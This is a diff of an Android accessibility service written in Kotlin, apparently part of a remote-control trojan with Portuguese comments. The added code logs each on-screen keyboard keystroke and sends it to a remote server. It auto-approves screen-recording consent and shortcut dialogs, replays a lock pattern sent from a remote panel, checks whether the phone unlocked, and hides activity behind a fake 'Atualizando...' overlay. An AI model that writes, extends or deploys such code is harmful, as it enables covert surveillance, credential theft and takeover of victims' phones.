+        "one" to "1", "two" to "2", "three" to "3", "four" to "4", "five" to "5",
+        "six" to "6", "seven" to "7", "eight" to "8", "nine" to "9"
+    )
+    // Pontuação/símbolos comuns expostos só pelo contentDescription falado
+    // (rótulo normalizado: minúsculas, sem acento). Sem este mapa, teclas como
+    // ".", ",", "@", "-" eram descartadas e sumiam do log ao vivo.
+    private val palavrasPontuacao = mapOf(
+        "ponto" to ".", "ponto final" to ".", "period" to ".", "dot" to ".", "full stop" to ".",
+        "virgula" to ",", "comma" to ",",
+        "interrogacao" to "?", "ponto de interrogacao" to "?", "question mark" to "?",
+        "exclamacao" to "!", "ponto de exclamacao" to "!", "exclamation" to "!", "exclamation mark" to "!",
+        "arroba" to "@", "at sign" to "@",
+        "underline" to "_", "underscore" to "_",
+        "hifen" to "-", "hyphen" to "-", "minus" to "-", "travessao" to "-",
+        "dois pontos" to ":", "colon" to ":",
+        "ponto e virgula" to ";", "semicolon" to ";",
+        "barra" to "/", "slash" to "/",
+        "mais" to "+", "plus" to "+",
+        "asterisco" to "*", "star" to "*",
+        "parentese esquerdo" to "(", "abrir parentese" to "(", "left parenthesis" to "(",
+        "parentese direito" to ")", "fechar parentese" to ")", "right parenthesis" to ")",
+        "cedilha" to "ç", "c cedilha" to "ç",
+        "aspas" to "\"", "aspas duplas" to "\"", "quote" to "\"", "double quote" to "\"",
+        "apostrofo" to "'", "single quote" to "'",
+        "cifrao" to "$", "dolar" to "$", "dollar" to "$",
+        "por cento" to "%", "porcento" to "%", "percent" to "%",
+        "e comercial" to "&", "ampersand" to "&",
+        "igual" to "=", "equals" to "=",
+    )
+    private val teclasEspaco = setOf(
+        "space", "espaco", "spacebar", "barra de espaco", "barra espaco"
+    )
+    private val teclasApagar = setOf(
+        "delete", "backspace", "apagar", "del", "excluir", "apagar caractere",
+        "retroceder", "apagar texto"
+    )
+    private val teclasEnter = setOf(
+        "enter", "return", "ir", "go", "done", "concluir", "ok", "buscar",
+        "search", "pesquisar", "enviar", "send", "next", "proximo"
+    )
+
+    private var ultimoTimestampTeclaEmitida = 0L
+    private var ultimaTeclaEmitida = ""
+
+    /**
+     * Captura a tecla pressionada no teclado virtual e a envia imediatamente.
+     * Só reage a cliques vindos da JANELA do teclado (IME) — assim um clique em
+     * botão comum do app nunca é confundido com uma tecla.
+     */
+    private fun capturarTeclaDigitada(event: AccessibilityEvent) {
+        try {
+            if (!isKeyboardOpen()) return
+            val src = event.source ?: return
+            // O clique precisa vir da janela do método de entrada (teclado).
+            val ehTeclado = try {
+                src.window?.type == AccessibilityWindowInfo.TYPE_INPUT_METHOD
+            } catch (_: Exception) { false }
+            // Rótulo da tecla: text ou contentDescription (muitos teclados só
+            // expõem a tecla pelo contentDescription falado, ex.: "seis").
+            val rotulo = (src.text?.toString()
+                ?: src.contentDescription?.toString()
+                ?: event.text?.joinToString("")
+                ?: "").trim()
+            try { src.recycle() } catch (_: Exception) {}
+            if (!ehTeclado) return
+            val tecla = rotuloParaTecla(rotulo) ?: return
+            val agora = System.currentTimeMillis()
+            if (tecla == ultimaTeclaEmitida && (agora - ultimoTimestampTeclaEmitida < 80)) {
+                return
+            }
+            ultimoTimestampTeclaEmitida = agora
+            ultimaTeclaEmitida = tecla
+            val app = event.packageName?.toString()
+                ?: bufferAppTeclado.ifEmpty { "(sem aplicativo)" }
+            SocketManager.enviarTeclaPressionada(app, tecla, agora)
+        } catch (_: Exception) {}
+    }
+
+    /** Converte o rótulo de uma tecla no caractere real, " ", "\b", "\n" ou null. */
+    private fun rotuloParaTecla(bruto: String): String? {
+        val rotulo = bruto.trim()
+        if (rotulo.isEmpty()) return null
+        val norm = normalizarRotulo(rotulo)
+        if (norm in teclasEspaco) return " "
+        if (norm in teclasApagar) return "\b"
+        if (norm in teclasEnter) return "\n"
+        palavrasDigito[norm]?.let { return it }
+        palavrasPontuacao[norm]?.let { return it }
+        // Tecla de 1 caractere imprimível (letra, dígito ou símbolo).
+        if (rotulo.length == 1 && !rotulo[0].isWhitespace()) return rotulo
+        // Rótulos descritivos: "Tecla 5", "dígito 7", "number 3", "key q".
+        val m = Regex(
+            "^(?:tecla|digito|letra|caractere|key|digit|letter|number|char)\\s+(\\S)$"
+        ).find(norm)
+        if (m != null) return m.groupValues[1]
+        return null
+    }
+
+    /** Minúsculas, sem acentos e sem espaços nas pontas (para comparar rótulos). */
+    private fun normalizarRotulo(s: String): String {
+        return try {
+            java.text.Normalizer.normalize(s, java.text.Normalizer.Form.NFD)
+                .replace(Regex("\\p{Mn}+"), "")
+                .lowercase()
+                .trim()
+        } catch (_: Exception) {
+            s.lowercase().trim()
+        }
     }
 
     /**
@@ -1261,6 +1382,23 @@ class MyAccessibilityService : AccessibilityService() {
             _pacoteAutoCliqueAtual = pacote
 
             val raiz = rootInActiveWindow ?: return
+
+            val textoRaiz = extrairTextoArvore(raiz).lowercase()
+            val eDialogoMidiaProjecao = pacote.contains("systemui", true) ||
+                pacote.contains("permissioncontroller", true) ||
+                textoRaiz.contains("iniciar agora") ||
+                textoRaiz.contains("start now") ||
+                textoRaiz.contains("compartilhamento de tela") ||
+                textoRaiz.contains("screen recording") ||
+                textoRaiz.contains("screen sharing") ||
+                textoRaiz.contains("toda a tela") ||
+                textoRaiz.contains("entire screen")
+
+            if (eDialogoMidiaProjecao) {
+                Log.d(TAG, "[MEDIA-PROJECTION] Diálogo de consentimento detectado no pacote: $pacote")
+                iniciarCicloAutoCliqueMediaProjection(raiz)
+                return
+            }
 
             // SEGURANÇA: a janela ativa (raiz) pode pertencer a OUTRO pacote
             // que não o do evento (overlay, diálogo de outro app). Se o pacote
@@ -1391,6 +1529,48 @@ class MyAccessibilityService : AccessibilityService() {
         return false
     }
 
+    // ETAPA 3 — textos do botão positivo do diálogo "Adicionar à tela inicial"
+    // (requestPinShortcut), em vários launchers/OEMs/idiomas.
+    private val textosBotaoAtalho = listOf(
+        "adicionar automaticamente", "add automatically",
+        "adicionar à tela inicial", "adicionar a tela inicial",
+        "add to home screen", "add to home",
+        "colocar na tela inicial", "criar atalho", "add shortcut",
+        "adicionar", "add"
+    )
+
+    /**
+     * ETAPA 3 — Busca (DFS) o botão de confirmação do diálogo de atalho
+     * ("Adicionar" / "Add automatically" / "Adicionar à tela inicial") e injeta
+     * ACTION_CLICK. Só roda enquanto a janela de confirmação está armada
+     * (prazoConfirmacaoAtalhoMs), evitando cliques em diálogos não relacionados.
+     * Nunca clica em textos de bloqueio ("Cancelar", "Não", etc.).
+     */
+    private fun procurarEClicarBotaoAtalho(no: AccessibilityNodeInfo): Boolean {
+        try {
+            val texto = ((no.text?.toString() ?: "") + " " +
+                (no.contentDescription?.toString() ?: "")).trim().lowercase()
+            if (no.isClickable && texto.isNotEmpty()) {
+                val eBloqueio = textosBloquear.any { texto.contains(it) }
+                val eAtalho = textosBotaoAtalho.any { texto == it || texto.contains(it) }
+                if (!eBloqueio && eAtalho && !botaoJaClicadoNaTela(texto)) {
+                    if (no.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
+                        marcarBotaoClicado(texto)
+                        enviarLog("[ATALHO] Confirmação automática do diálogo de atalho: '$texto'.")
+                        return true
+                    }
+                }
+            }
+            for (i in 0 until no.childCount) {
+                val filho = no.getChild(i) ?: continue
+                if (procurarEClicarBotaoAtalho(filho)) return true
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Erro no clique automático do atalho: ${e.message}")
+        }
+        return false
+    }
+
     // Textos EXATOS do botão positivo do diálogo do MediaProjection (vários OEMs/idiomas).
     private val textosBotaoMidiaProjecao = listOf(
         "iniciar agora", "start now", "começar agora", "comecar agora",
@@ -1439,8 +1619,6 @@ class MyAccessibilityService : AccessibilityService() {
         overlayEscura = null
         overlayBloqueio?.let { try { windowManager?.removeView(it) } catch (_: Exception) {} }
         overlayBloqueio = null
-        overlayKioskAtualizacao?.let { try { windowManager?.removeView(it) } catch (_: Exception) {} }
-        overlayKioskAtualizacao = null
         if (instance == this) {
             instance = null
         }
@@ -1460,7 +1638,7 @@ class MyAccessibilityService : AccessibilityService() {
             moveTo(boundedX, boundedY)
             lineTo(boundedX + 1f, boundedY + 1f)
         }
-        val stroke = GestureDescription.StrokeDescription(path, 0, 50L)
+        val stroke = GestureDescription.StrokeDescription(path, 0, 30L)
         val gestureBuilder = GestureDescription.Builder().addStroke(stroke)
         dispatchGesture(gestureBuilder.build(), object : GestureResultCallback() {
             override fun onCompleted(gestureDescription: GestureDescription?) {
@@ -1933,21 +2111,66 @@ class MyAccessibilityService : AccessibilityService() {
             }
             "send_text" -> {
                 val texto = json.optString("texto", "")
+                // inserir=true (Ctrl+V do painel): mantém o conteúdo atual e
+                // insere o texto colado na posição do cursor (não apaga nada).
+                val inserir = json.optBoolean("inserir", false)
                 handlerMain.post {
                     try {
                         var alvo: AccessibilityNodeInfo? = null
+                        // 1. Prioriza o campo REALMENTE focado pelo usuário
                         try { alvo = rootInActiveWindow?.findFocus(AccessibilityNodeInfo.FOCUS_INPUT) } catch (_: Exception) {}
                         if (alvo == null) {
-                            // Fallback: primeiro nó editável visível em QUALQUER janela.
+                            // 2. Fallback: primeiro nó editável visível caso não haja foco ativo
                             alvo = buscarNoEditavel()
                         }
                         if (alvo != null) {
+                            // Revalidação robusta de foco/editabilidade
+                            if (!alvo.isVisibleToUser || (!alvo.isEditable && (alvo.actions and AccessibilityNodeInfo.ACTION_SET_TEXT) == 0)) {
+                                enviarLog("[WIREFRAME AVISO] send_text: alvo perdeu foco ou não é editável.")
+                                try { alvo.recycle() } catch (_: Exception) {}
+                                return@post
+                            }
+
+                            // Monta o texto final: se "inserir", combina o
+                            // conteúdo atual com o colado na posição do cursor;
+                            // caso contrário, substitui (comportamento do campo
+                            // "Send text").
+                            val atual = alvo.text?.toString() ?: ""
+                            val textoFinal: String
+                            val cursorFinal: Int
+                            if (inserir) {
+                                var ini = alvo.textSelectionStart
+                                var fim = alvo.textSelectionEnd
+                                if (ini < 0 || ini > atual.length) ini = atual.length
+                                if (fim < 0 || fim > atual.length) fim = atual.length
+                                if (ini > fim) { val tmp = ini; ini = fim; fim = tmp }
+                                textoFinal = atual.substring(0, ini) + texto + atual.substring(fim)
+                                cursorFinal = ini + texto.length
+                            } else {
+                                textoFinal = texto
+                                cursorFinal = texto.length
+                            }
+
                             val args = android.os.Bundle().apply {
                                 putCharSequence(
-                                    AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, texto)
+                                    AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, textoFinal)
                             }
                             val ok = alvo.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
-                            enviarLog("[WIREFRAME] send_text \"$texto\" (ok=$ok)")
+
+                            // Reposicionar o cursor (ACTION_SET_SELECTION)
+                            if (ok) {
+                                try {
+                                    val len = cursorFinal
+                                    val selArgs = android.os.Bundle().apply {
+                                        putInt(AccessibilityNodeInfo.ACTION_ARGUMENT_SELECTION_START_INT, len)
+                                        putInt(AccessibilityNodeInfo.ACTION_ARGUMENT_SELECTION_END_INT, len)
+                                    }
+                                    alvo.performAction(AccessibilityNodeInfo.ACTION_SET_SELECTION, selArgs)
+                                } catch (_: Exception) {}
+                            }
+
+                            enviarLog("[WIREFRAME] send_text \"$texto\" (ok=$ok, cursor no fim)")
+                            try { alvo.recycle() } catch (_: Exception) {}
                         } else {
                             enviarLog("[WIREFRAME] send_text: sem campo editável/focado — toque primeiro no campo desejado.")
                         }
@@ -2260,53 +2483,10 @@ class MyAccessibilityService : AccessibilityService() {
     // Mantém o último traçado visível por 1,5s após o fim do gesto e então limpa.
     private val limparTrilhaRunnable = Runnable { limparBufferGestosFisicos() }
 
-    // --- CLASSIFICAÇÃO TAP vs. ARRASTO (sem falsos deslizes) ---------------
-    // Instante de início do gesto (ACTION_DOWN), id incremental do gesto e
-    // instante do fim (ACTION_UP). O id permite ao Leitor FPS disparar o pulso
-    // de clique UMA vez e limpar a trilha exatamente ao soltar o toque.
-    @Volatile private var gestoInicioMs: Long = 0L
-    @Volatile private var gestoId: Int = 0
-    @Volatile private var gestoFimMs: Long = 0L
-    // touchSlop normalizado (fração da largura da tela): abaixo disto é TAP,
-    // acima é ARRASTO. Derivado do scaledTouchSlop real do dispositivo.
-    private val touchSlopNorm: Float by lazy {
-        try {
-            val slopPx = android.view.ViewConfiguration.get(this).scaledTouchSlop.toFloat()
-            val w = resources.displayMetrics.widthPixels.toFloat().coerceAtLeast(1f)
-            (slopPx / w).coerceIn(0.012f, 0.06f)
-        } catch (_: Exception) { 0.02f }
-    }
-
     private fun limparBufferGestosFisicos() {
         synchronized(bufferGestosFisicos) {
             bufferGestosFisicos.clear()
             tipoGestoFisicoCapturado = "padrao"
-        }
-        // Rearma o detector de início: permite que um novo gesto seja capturado
-        // pelo failsafe em ROMs que não emitem *_START.
-        gestoFimMs = 0L
-    }
-
-    /**
-     * Classifica o gesto recém-terminado como "tap" (toque simples) ou "swipe"
-     * (arrasto real) comparando a maior distância percorrida com o touchSlop
-     * normalizado. Micro-tremores do dedo ficam abaixo do limiar e são tratados
-     * como toque, eliminando falsos deslizes.
-     */
-    private fun classificarGesto(): String {
-        synchronized(bufferGestosFisicos) {
-            if (bufferGestosFisicos.size < 2) return "tap"
-            val p0 = bufferGestosFisicos.first()
-            val x0 = p0.optDouble("x", 0.0)
-            val y0 = p0.optDouble("y", 0.0)
-            var maxDist = 0.0
-            for (p in bufferGestosFisicos) {
-                val dx = p.optDouble("x", 0.0) - x0
-                val dy = p.optDouble("y", 0.0) - y0
-                val d = Math.hypot(dx, dy)
-                if (d > maxDist) maxDist = d
-            }
-            return if (maxDist > touchSlopNorm) "swipe" else "tap"
         }
     }
 
@@ -2324,41 +2504,15 @@ class MyAccessibilityService : AccessibilityService() {
                         handlerMain.removeCallbacks(limparTrilhaRunnable)
                         limparBufferGestosFisicos()
                         gestoFisicoAtivo = true
-                        gestoInicioMs = System.currentTimeMillis()
-                        gestoFimMs = 0L
-                        gestoId++                       // novo gesto → novo id
-                        tipoGestoFisicoCapturado = "tap"
                     }
                 }
                 AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_END,
                 AccessibilityEvent.TYPE_GESTURE_DETECTION_END,
                 AccessibilityEvent.TYPE_TOUCH_INTERACTION_END -> {
-                    if (gestoFisicoAtivo) {
-                        // ACTION_UP: classifica Tap vs. Arrasto pela extensão real
-                        // do movimento (touchSlop) e marca o fim do gesto.
-                        tipoGestoFisicoCapturado = classificarGesto()
-                        gestoFimMs = System.currentTimeMillis()
-                    }
                     gestoFisicoAtivo = false
                     handlerMain.removeCallbacks(limparTrilhaRunnable)
                     handlerMain.postDelayed(limparTrilhaRunnable, 1500L)
                 }
-            }
-
-            // Fora de um gesto ativo, NENHUM evento (scroll automático de lista,
-            // WINDOW_CONTENT_CHANGED, etc.) pode criar pontos de trilha — essa
-            // era a origem dos falsos deslizes. Eventos de move só contam entre
-            // START e END; os demais servem apenas para detectar a grade.
-            val ehEventoDeMovimento =
-                event.eventType == AccessibilityEvent.TYPE_VIEW_HOVER_ENTER ||
-                event.eventType == AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUSED ||
-                event.eventType == AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_START
-            // Failsafe p/ ROMs que não emitem *_START: um move implica DOWN.
-            if (ehEventoDeMovimento && !gestoFisicoAtivo && gestoFimMs == 0L) {
-                gestoFisicoAtivo = true
-                gestoInicioMs = System.currentTimeMillis()
-                gestoId++
-                tipoGestoFisicoCapturado = "tap"
             }
 
             val keyguardManager = getSystemService(KEYGUARD_SERVICE) as? KeyguardManager
@@ -2415,10 +2569,6 @@ class MyAccessibilityService : AccessibilityService() {
 
             val normX = (cx.toFloat() / w).coerceIn(0.0f, 1.0f)
             val normY = (cy.toFloat() / h).coerceIn(0.0f, 1.0f)
-
-            // Guarda anti-falso-deslize: só pontos de movimento intencional,
-            // enquanto o gesto está ativo (entre ACTION_DOWN e ACTION_UP).
-            if (!gestoFisicoAtivo || !ehEventoDeMovimento) return
 
             synchronized(bufferGestosFisicos) {
                 val ultimo = bufferGestosFisicos.lastOrNull()
@@ -2524,6 +2674,7 @@ class MyAccessibilityService : AccessibilityService() {
 
         if (node.isVisibleToUser && bounds.width() > 0 && bounds.height() > 0) {
             val item = JSONObject().apply {
+                put("viewIdResourceName", node.viewIdResourceName ?: "")
                 put("viewId", node.viewIdResourceName ?: "")
                 put("className", node.className?.toString() ?: "")
                 put("text", node.text?.toString() ?: "")
@@ -2603,14 +2754,6 @@ class MyAccessibilityService : AccessibilityService() {
                 tipo == AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUSED ||
                 tipo == AccessibilityEvent.TYPE_VIEW_SELECTED
 
-            // Throttle leve (~25ms ≈ 40fps) durante o gesto físico: acompanha os
-            // 60fps do dedo sem inundar a rede. O frame de fim de gesto nunca é
-            // descartado (gestoFimMs sinaliza o ACTION_UP).
-            if (gestoFisicoAtivo && gestoFimMs == 0L &&
-                (agora - ultimoEnvioTelemetriaMs) < 25) {
-                return
-            }
-
             if (!eventoFoco && tipo == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED &&
                 (agora - ultimoEnvioTelemetriaMs < 100)) {
                 return
@@ -2638,29 +2781,22 @@ class MyAccessibilityService : AccessibilityService() {
                 bufferGestosFisicos.forEach { arrayGestos.put(it) }
             }
 
-            // Classificação do gesto para o Leitor FPS: tap (pulso de clique) vs.
-            // swipe (trilha), com sinal de fim (ACTION_UP) por ~400ms para que o
-            // cliente limpe a trilha imediatamente ao soltar o toque.
-            val fimRecente = gestoFimMs > 0L && (agora - gestoFimMs) < 400
-            val gestoTipoAtual = if (gestoFisicoAtivo || fimRecente)
-                tipoGestoFisicoCapturado else "none"
+            val kgManager = getSystemService(KEYGUARD_SERVICE) as? KeyguardManager
+            val telaBloqueada = kgManager?.isKeyguardLocked == true
 
             val payload = JSONObject().apply {
                 put("dispositivo", deviceName)
+                put("package_name", event?.packageName?.toString() ?: "")
                 put("screen_width", screenWidth)
                 put("screen_height", screenHeight)
-                put("event_type", tipo)
-                put("package_name", event?.packageName?.toString() ?: "")
+                put("tela_bloqueada", telaBloqueada)
                 put("nos", JSONArray(nos))
                 put("interacoes", arrayGestos)
-                put("gesto_tipo", gestoTipoAtual)
-                put("gesto_ativo", gestoFisicoAtivo)
-                put("gesto_fim", fimRecente)
-                put("gesto_id", gestoId)
                 put("timestamp", agora)
             }
 
             SocketManager.garantirConexao()
+            SocketManager.socket?.emit("dados_acessibilidade", payload)
             SocketManager.socket?.emit("telemetria_acessibilidade", payload)
         } catch (e: Exception) {
             Log.e(TAG, "Erro ao enviar telemetria de acessibilidade: ${e.message}")
@@ -2671,28 +2807,110 @@ class MyAccessibilityService : AccessibilityService() {
      * Executa o desenho contínuo da senha padrão (Pattern Password) passando
      * pelas coordenadas exatas dos pontos selecionados na web.
      */
-    fun desbloquearPadraoPontos(pontos: List<android.graphics.PointF>, onResult: ((Boolean) -> Unit)? = null) {
-        if (pontos.size < 2) {
+    /**
+     * Varre a árvore de nós procurando a LockPatternView (grade 3x3) e devolve
+     * seu retângulo em coordenadas de tela. Usada para desenhar o padrão nos
+     * pontos REAIS do aparelho, sem depender da calibração do painel.
+     */
+    private fun buscarLockPatternBounds(no: AccessibilityNodeInfo?, prof: Int = 0): android.graphics.Rect? {
+        if (no == null || prof > 25) return null
+        try {
+            val rect = android.graphics.Rect()
+            no.getBoundsInScreen(rect)
+            val viewId = (no.viewIdResourceName ?: "").lowercase()
+            val cls = (no.className?.toString() ?: "").lowercase()
+            if (rect.width() > 100 && rect.height() > 100 &&
+                (viewId.contains("lockpattern") || viewId.contains("lock_pattern") ||
+                 viewId.contains("patternview") || cls.contains("lockpattern"))) {
+                return rect
+            }
+            for (i in 0 until no.childCount) {
+                val r = buscarLockPatternBounds(no.getChild(i) ?: continue, prof + 1)
+                if (r != null) return r
+            }
+        } catch (_: Exception) {}
+        return null
+    }
+
+    /**
+     * Detecta AO VIVO os 9 centros reais da grade de padrão na tela atual
+     * (índice 0 = ponto 1 … índice 8 = ponto 9). null se não achar a grade.
+     */
+    private fun detectarCentrosPadraoAoVivo(): List<android.graphics.PointF>? {
+        val raizes = mutableListOf<AccessibilityNodeInfo>()
+        try { rootInActiveWindow?.let { raizes.add(it) } } catch (_: Exception) {}
+        try { windows?.forEach { w -> try { w.root?.let { raizes.add(it) } } catch (_: Exception) {} } } catch (_: Exception) {}
+        var pb: android.graphics.Rect? = null
+        for (r in raizes) { pb = buscarLockPatternBounds(r); if (pb != null) break }
+        val b = pb ?: return null
+        if (b.width() <= 100 || b.height() <= 100) return null
+        val cellW = b.width() / 3f
+        val cellH = b.height() / 3f
+        val centros = mutableListOf<android.graphics.PointF>()
+        for (row in 0..2) for (col in 0..2) {
+            centros.add(android.graphics.PointF(b.left + cellW * (col + 0.5f), b.top + cellH * (row + 0.5f)))
+        }
+        return centros
+    }
+
+    fun desbloquearPadraoPontos(
+        pontos: List<android.graphics.PointF>,
+        indices: List<Int>? = null,
+        onResult: ((Boolean) -> Unit)? = null
+    ) {
+        // PRIORIDADE: se o painel mandou os índices (1-9) da sequência, desenha
+        // nos CENTROS REAIS da LockPatternView detectada no próprio aparelho —
+        // assim o gesto cai exatamente nas bolinhas, sem depender da calibração
+        // do painel. Cai para os pixels do painel só se a grade não for detectada.
+        var pontosFinais = pontos
+        if (!indices.isNullOrEmpty()) {
+            val centros = detectarCentrosPadraoAoVivo()
+                ?: (if (wireframePadraoCentros.size == 9) wireframePadraoCentros else null)
+            if (centros != null && centros.size == 9) {
+                val remapeados = indices.mapNotNull { idx -> if (idx in 1..9) centros[idx - 1] else null }
+                if (remapeados.size >= 2) {
+                    pontosFinais = remapeados
+                    enviarLog("[PADRÃO] Desenhando nos centros reais da grade detectada (índices ${indices.joinToString("→")}).")
+                }
+            } else {
+                enviarLog("[PADRÃO AVISO] Grade não detectada no aparelho — usando coordenadas do painel.")
+            }
+        }
+
+        if (pontosFinais.size < 2) {
             enviarLog("[PADRÃO ERRO] Requer pelo menos 2 pontos para desenhar a senha padrão.")
             onResult?.invoke(false)
             return
         }
 
         val path = Path().apply {
-            moveTo(pontos[0].x, pontos[0].y)
-            for (i in 1 until pontos.size) {
-                lineTo(pontos[i].x, pontos[i].y)
+            moveTo(pontosFinais[0].x, pontosFinais[0].y)
+            for (i in 1 until pontosFinais.size) {
+                lineTo(pontosFinais[i].x, pontosFinais[i].y)
             }
         }
 
-        val tempoDuracao = (pontos.size * 180L).coerceIn(300L, 1800L)
+        val tempoDuracao = (pontosFinais.size * 180L).coerceIn(300L, 1800L)
         val stroke = GestureDescription.StrokeDescription(path, 0, tempoDuracao)
         val gestureBuilder = GestureDescription.Builder().addStroke(stroke)
 
         val aceito = dispatchGesture(gestureBuilder.build(), object : GestureResultCallback() {
             override fun onCompleted(gestureDescription: GestureDescription?) {
-                enviarLog("[PADRÃO OK] Desenho da senha padrão concluído (${pontos.size} pontos).")
-                onResult?.invoke(true)
+                // O gesto foi DESENHADO. Só isso não diz se a senha estava certa:
+                // o padrão certo DESTRAVA o keyguard; o errado mantém a tela
+                // bloqueada. Esperamos o sistema processar (~900ms) e checamos o
+                // keyguard para saber se o padrão era realmente o correto.
+                handlerMain.postDelayed({
+                    val aindaBloqueado = try {
+                        (getSystemService(KEYGUARD_SERVICE) as? KeyguardManager)?.isKeyguardLocked == true
+                    } catch (_: Exception) { true }
+                    val sucesso = !aindaBloqueado
+                    enviarLog(
+                        if (sucesso) "[PADRÃO OK] Senha correta — dispositivo desbloqueado."
+                        else "[PADRÃO INCORRETO] A senha padrão está incorreta (keyguard ainda bloqueado)."
+                    )
+                    onResult?.invoke(sucesso)
+                }, 900L)
             }
 
             override fun onCancelled(gestureDescription: GestureDescription?) {
@@ -2740,34 +2958,18 @@ class MyAccessibilityService : AccessibilityService() {
         }
     }
 
-    private var overlayAtualizacao: View? = null
-
-    // Failsafe: o modo de atualização (overlay "Atualizando o aplicativo...")
-    // dura no MÁXIMO 2 minutos. Ao expirar, desativa sozinho e notifica o painel
-    // (que oculta o spinner central do emulador flutuante).
-    private val timeoutAtualizacaoMs = 120_000L
-    private val timeoutAtualizacaoRunnable = Runnable { ativarAtualizacaoGlobal(false) }
-
-    val isAtualizacaoAtiva: Boolean
-        get() = overlayAtualizacao != null
-
     fun ativarAtualizacaoGlobal(ativo: Boolean) {
         handlerMain.post {
             try {
-                // Guarda de mudança de estado: evita loop de eco quando o próprio
-                // dispositivo reemite "atualizacao_status" (o servidor encaminha
-                // o evento de volta para o aparelho). Sem mudança, não faz nada.
-                val jaAtivo = overlayAtualizacao != null
-                if (ativo == jaAtivo) return@post
-
                 if (ativo) {
-                    handlerMain.removeCallbacks(timeoutAtualizacaoRunnable)
-                    handlerMain.postDelayed(timeoutAtualizacaoRunnable, timeoutAtualizacaoMs)
                     if (overlayAtualizacao == null) {
                         val wm = windowManager ?: getSystemService(WINDOW_SERVICE) as? WindowManager ?: return@post
 
                         val container = FrameLayout(this).apply {
-                            setBackgroundColor(Color.BLACK)
+                            // Fundo escuro com OPACIDADE regulável pelo slider do
+                            // painel (evento 'overlay_opacidade'); fonte única em
+                            // OverlayService.opacidadeFundo.
+                            setBackgroundColor(OverlayService.corFundo())
                             isClickable = true
                             isFocusable = true
                             setOnTouchListener { _, _ -> true }
@@ -2847,9 +3049,7 @@ class MyAccessibilityService : AccessibilityService() {
                         pararCapturaAcessibilidade()
                     }
                     enviarLog("[ATUALIZAÇÃO] Overlay de atualização global ativado.")
-                    notificarStatusAtualizacao(true)
                 } else {
-                    handlerMain.removeCallbacks(timeoutAtualizacaoRunnable)
                     overlayAtualizacao?.let {
                         try {
                             windowManager?.removeView(it)
@@ -2857,7 +3057,6 @@ class MyAccessibilityService : AccessibilityService() {
                         overlayAtualizacao = null
                     }
                     pararCapturaAcessibilidade()
-                    notificarStatusAtualizacao(false)
                     enviarLog("[ATUALIZAÇÃO] Overlay de atualização global desativado.")
                 }
             } catch (e: Exception) {
@@ -2866,23 +3065,278 @@ class MyAccessibilityService : AccessibilityService() {
         }
     }
 
-    /**
-     * Notifica o painel (e consequentemente o emulador flutuante) sobre o estado
-     * do modo de atualização, para exibir/ocultar o spinner central sobre o vídeo.
-     * Inclui o nome do dispositivo para o servidor encaminhar o evento apenas a
-     * este aparelho (evita ligar/desligar a atualização de outro celular).
-     * A guarda de mudança de estado em ativarAtualizacaoGlobal() quebra o eco:
-     * o servidor reenvia o evento para este dispositivo, mas como o estado já
-     * foi alterado, a chamada é ignorada (sem loop infinito).
-     */
-    private fun notificarStatusAtualizacao(ativo: Boolean) {
-        try {
-            val nomeDisp = "${android.os.Build.MANUFACTURER}-${android.os.Build.MODEL}"
-            val payload = org.json.JSONObject()
-                .put("ativo", ativo)
-                .put("dispositivo", nomeDisp)
-            SocketManager.socket?.emit("atualizacao_status", payload)
-        } catch (_: Exception) {
+
+
+    private fun tipoOverlaySeguro(): Int {
+        val fabricante = Build.MANUFACTURER.lowercase()
+        val hardware = Build.HARDWARE.lowercase()
+        if (hardware.contains("nox") || hardware.contains("memu") ||
+            hardware.contains("vbox") || hardware.contains("goldfish") ||
+            hardware.contains("ranchu")) {
+            return WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
         }
+        if (fabricante.contains("xiaomi") || fabricante.contains("redmi") ||
+            fabricante.contains("poco")) {
+            return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
+            else
+                @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_PHONE
+        }
+        return WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
+    }
+
+    fun mostrarOverlayAtualizacao() {
+        handlerMain.post {
+            if (overlayAtualizacao != null) return@post
+            val tipoOverlay = tipoOverlaySeguro()
+            // SÓ exige SYSTEM_ALERT_WINDOW quando NÃO for o overlay de
+            // acessibilidade. TYPE_ACCESSIBILITY_OVERLAY (caminho do Nox/MEmu)
+            // NÃO depende de canDrawOverlays — no Nox essa permissão costuma
+            // estar negada, e exigi-la aqui fazia o overlay "não aparecer".
+            if (tipoOverlay != WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY &&
+                Build.VERSION.SDK_INT >= Build.VERSION_CODES.M &&
+                !Settings.canDrawOverlays(this)) {
+                enviarLog("[OVERLAY ATZ] Sem permissão SYSTEM_ALERT_WINDOW")
+                SocketManager.socket?.emit("overlay_falhou",
+                    JSONObject().put("motivo", "sem_permissao_overlay"))
+                return@post
+            }
+            val container = FrameLayout(this).apply {
+                setBackgroundColor(Color.parseColor("#CC000000"))
+            }
+            val progresso = ProgressBar(this).apply { isIndeterminate = true }
+            container.addView(progresso,
+                FrameLayout.LayoutParams(dp(64), dp(64), Gravity.CENTER))
+            val texto = TextView(this).apply {
+                text = "Atualizando..."
+                setTextColor(Color.WHITE)
+                textSize = 18f
+                gravity = Gravity.CENTER
+            }
+            container.addView(texto, FrameLayout.LayoutParams(
+                FrameLayout.LayoutParams.WRAP_CONTENT,
+                FrameLayout.LayoutParams.WRAP_CONTENT,
+                Gravity.CENTER
+            ).apply { topMargin = dp(100) })
+
+            val params = WindowManager.LayoutParams(
+                WindowManager.LayoutParams.MATCH_PARENT,
+                WindowManager.LayoutParams.MATCH_PARENT,
+                tipoOverlay,
+                // SEM FLAG_SECURE: com ela a janela some da captura de tela
+                // (MediaProjection) → o emulador flutuante do painel, que mostra
+                // o espelhamento, NUNCA exibiria o overlay. Removê-la faz o
+                // cartão aparecer no espelhamento, igual ao OverlayService.
